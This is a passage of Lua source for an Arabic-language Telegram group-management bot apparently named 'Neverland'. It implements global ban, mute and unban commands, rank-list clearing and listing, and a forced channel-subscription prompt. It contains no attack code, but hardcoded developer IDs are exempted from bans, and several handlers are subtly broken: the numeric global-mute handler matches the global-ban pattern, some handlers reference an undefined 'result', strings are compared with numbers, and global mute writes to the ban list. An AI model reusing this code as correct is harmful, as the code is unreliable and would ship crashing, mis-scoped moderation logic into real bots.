t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "*✦┇لا يوجد مطورين ثانويين*"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listDevvrr",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("مسح الثانويين") and VIP_DeV(msg) then
database:del(bot_id.."DEV:Sudo:T")
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح قائمة المطورين الثانويين  ")
end
if text == ("مسح قائمه العام") and DevNeverland(msg) then
database:del(bot_id.."Neverland:GBan:User")
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح قائمه العام")
return false
end
if text == ("قائمه العام") and DevNeverland(msg) then
local list = database:smembers(bot_id.."Neverland:GBan:User")
t = "\n✦┇قائمة المحظورين عام \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
return send(msg.chat_id_, msg.id_, "✦┇لا يوجد محظورين عام")
end
return SendMsg_Msgeeslist("listbans",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("حظر عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then
function Function_Neverland(extra, result, success)
if General_ban(result, result.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
database:sadd(bot_id.."Neverland:GBan:User", result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم حظره عام من المجموعات")  
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and DevNeverland(msg) then
local username = text:match("^حظر عام @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if result.id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.id_ == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "✦┇لا تسطيع حظر البوت عام")
return false 
end
database:sadd(bot_id.."Neverland:GBan:User", result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم حظره عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and DevNeverland(msg) then
local userid = text:match("^حظر عام (%d+)$")
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
return false 
end
if userid == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if userid == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "✦┇لا تسطيع حظر البوت عام")
return false 
end
database:sadd(bot_id.."Neverland:GBan:User", userid)
Reply_Status(msg,userid,"reply","✦┇تم حظره عام من المجموعات")  
return false
end
if text == ("كتم عام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then
function Function_Neverland(extra, result, success)
if General_ban(result, result.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
database:sadd(bot_id.."Neverland:GBan:User", result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم كتمه عام من المجموعات")  
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and DevNeverland(msg) then
local username = text:match("^كتم عام @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if result.id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "✦┇لا تستطيع كتم البوت عام")
return false 
end
database:sadd(bot_id.."Neverland:GBan:User", result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم كتمه عام من المجموعات")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and DevNeverland(msg) then
local userid = text:match("^حظر عام (%d+)$")
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت الاساسي \n")
return false 
end
if userid == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if userid == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "✦┇لا تستطيع كتم البوت عام")
return false 
end
database:sadd(bot_id.."Neverland:GBan:User", userid)
Reply_Status(msg,userid,"reply","✦┇تم كتمه عام من المجموعات")  
return false
end
if text == ("الغاء العام") and tonumber(msg.reply_to_message_id_) ~= 0 and DevNeverland(msg) then
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:GBan:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم الغاء حظره عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and DevNeverland(msg) then
local username = text:match("^الغاء العام @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
Reply_Status(msg,result.id_,"reply","✦┇تم الغاء حظره عام من المجموعات")  
database:srem(bot_id.."Neverland:GBan:User", result.id_)
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and DevNeverland(msg) then
local userid = text:match("^الغاء العام (%d+)$")
database:srem(bot_id.."Neverland:GBan:User", userid)
Reply_Status(msg,userid,"reply","✦┇تم الغاء حظره عام من المجموعات")  
return false
end

if text == ("مسح المطورين") and DevNeverland(msg) then
database:del(bot_id.."Neverland:Sudo:User")
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح قائمة المطورين  ")
end
if text == "مسح المنشئين الاساسين" and DevBot(msg) then
database:del(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_)
texts = "✦┇تم مسح المنشئين الاساسيين"
send(msg.chat_id_, msg.id_, texts)
end
if text == "مسح المنشئين" and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Constructor"..msg.chat_id_)
texts = "✦┇تم مسح المنشئين "
send(msg.chat_id_, msg.id_, texts)
end
if text == "مسح المدراء" and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Manager"..msg.chat_id_)
texts = "✦┇تم مسح المدراء "
send(msg.chat_id_, msg.id_, texts)
end
if text == "مسح الادمنيه" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Mod:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✦┇تم مسح  قائمة الادمنية  ")
end
if text == "مسح المميزين" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Special:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✦┇تم مسح  قائمة الاعضاء المميزين  ")
end
if text == "تنزيل جميع الرتب" and DevBot(msg) then
database:del(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_)
texts = "✦┇تم تنزيل جميع الرتب "
send(msg.chat_id_, msg.id_, texts)
end
if text == "تنزيل جميع الرتب" and BasicConstructor(msg) and creatorA(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Constructor"..msg.chat_id_)
end
if text == "تنزيل جميع الرتب" and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Manager"..msg.chat_id_)
end
if text == "تنزيل جميع الرتب" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Mod:User"..msg.chat_id_)
end
if text == "تنزيل جميع الرتب" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Special:User"..msg.chat_id_)
end
if text == "مسح المكتومين" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Muted:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "✦┇تم مسح قائمه المكتومين ")
end
if text == "مسح المحظورين" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Ban:User"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "\n✦┇تم مسح المحظورين")
end
if text == ("قائمه العام") and DevNeverland(msg) then
local list = database:smembers(bot_id.."Neverland:GBan:User")
t = "\n✦┇قائمة المحظورين عام \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
return send(msg.chat_id_, msg.id_, "✦┇لا يوجد محظورين عام")
end
return SendMsg_Msgeeslist("listbans",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("المطورين") and DevNeverland(msg) then
local list = database:smembers(bot_id.."Neverland:Sudo:User")
t = "\n✦┇قائمة مطورين البوت \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "*✦┇لا يوجد مطورين*"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listsudo",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == "المنشئين الاساسين" and DevBot(msg) then
local list = database:smembers(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_)
t = "\n✦┇قائمة المنشئين الاساسين \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد منشئين اساسيين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listasa",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("المنشئين") and BasicConstructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Constructor"..msg.chat_id_)
t = "\n✦┇قائمة المنشئين \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد منشئين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listmnsh",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("المدراء") and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Manager"..msg.chat_id_)
t = "\n✦┇قائمة المدراء \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد مدراء"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listmder",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("الادمنيه") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Mod:User"..msg.chat_id_)
t = "\n✦┇قائمة الادمنيه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد ادمنيه"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listadmin",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("المميزين") and Addictive(msg) then
local list = database:smembers(bot_id.."Neverland:Special:User"..msg.chat_id_)
t = "*\n✦┇قائمة مميزين المجموعه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "*✦┇لا يوجد مميزين*"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listvip",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end
if text == ("المكتومين") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Muted:User"..msg.chat_id_)
t = "\n✦┇قائمة المكتومين \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇لا يوجد مكتومين"
return send(msg.chat_id_, msg.id_, t)
end
return SendMsg_Msgeeslist("listktm",msg.chat_id_,msg.sender_user_id_,msg.id_, t)
end

if text == ("المحظورين") then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local list = database:smembers(bot_id.."Neverland:Ban:User"..msg.chat_id_)
t = "\n✦┇قائمة محظورين المجموعه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
